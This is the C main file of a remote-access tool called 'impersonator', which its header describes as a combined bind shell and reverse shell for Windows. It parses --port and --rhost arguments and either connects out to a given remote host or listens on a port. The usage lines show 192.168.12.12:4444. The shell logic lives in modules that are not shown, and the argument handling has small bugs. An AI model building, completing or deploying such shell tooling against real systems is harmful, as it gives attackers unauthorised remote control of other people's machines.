/*
* Author: Aleksa Zatezalo
* Date: September 2023
* Description: The impersonator shell that combines winserver.c, doexec.c, spoofer.c and impersonator.c into a bind-shell
*              and reverse shell binary. 
*/

#include "doexec.h"
#include "winserver.h"
#include "spoofer.h"

/*
* THINGS TO DO
* 1. Add Impersonation
*/
int main(int argc, char *argv[]) {
    if(argc < 3){
        printf("USAGE: .\\impersonator --port 4444 \n");
        printf("USAGE: .\\impersonator --rhost 192.168.12.12 --port 4444 \n");
        exit(1);
    }
    
    int port;
    char *rhost = '\0';
    for (int i = 0; i < argc; i++){
        if (!strcmp(argv[i], "--port")){
            port = atoi(argv[i + 1]);
        }
        if (!strcmp(argv[i], "--rhost")){
            rhost = argv[i + 1];
        }
    }

    if (rhost){
        client(rhost, port);
    } else {
        server(port);
    }
    
    return 0;
}